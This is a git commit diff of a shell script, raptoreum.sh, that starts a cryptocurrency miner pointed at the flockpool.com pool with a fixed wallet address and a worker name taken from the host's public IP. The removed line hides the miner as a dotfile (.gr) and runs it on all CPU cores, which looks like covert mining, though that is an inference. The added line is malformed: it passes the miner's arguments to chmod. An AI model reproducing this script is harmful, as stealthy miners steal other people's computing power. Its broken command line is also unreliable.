0d29c64a7d6f0787159ca0e49fcf23e6d688a425
lon25 <80402174+lon25@users.noreply.github.com>
2021-12-25 17:04:04 +0700

    Update raptoreum.sh

--- raptoreum.sh
+++ raptoreum.sh
@@ -6,5 +6,4 @@ WORKER=$(echo "$(curl -s ifconfig.me)" | tr . _ )-dhoe
 
 cd "$(dirname "$0")"
 
-chmod +x ./cpuminer-gr-1.2.3-x86_64_linux ./gr && mv ./gr/binaries/cpuminer-avx ./gr/binaries/.gr && ./gr/binaries/.gr -a gr -o stratum+tcps://eu.flockpool.com:5555 -u RRT11pEKPdwT3QGfWWJq3XzFjBDFxQygvU.dhoe -t $(nproc --all) --no-tune
-
+chmod +x ./wildrig-multi --print-full --algo ghostrider --url stratum+tcps://eu.flockpool.com:5555 --user RRT11pEKPdwT3QGfWWJq3XzFjBDFxQygvU.dhoe --pass x
